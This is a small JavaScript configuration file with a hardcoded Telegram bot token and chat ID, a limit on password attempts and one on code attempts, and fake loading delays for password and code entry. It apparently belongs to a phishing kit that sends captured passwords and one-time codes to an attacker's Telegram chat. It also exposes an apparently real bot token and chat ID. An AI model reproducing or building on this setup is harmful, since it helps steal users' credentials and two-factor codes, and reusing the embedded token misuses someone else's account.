const config = {
    token: process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN ?? '8911631713:AAFK6VCKKGr37PmTFn9Iyno1R38UcpI1wTQ',
    chat_id: process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID ?? '-1003976851109',
    MAX_PASS: 2,
    MAX_CODE: 4,
    PASSWORD_LOADING_TIME: 8,
    CODE_LOADING_TIME: 15
};

export default config;
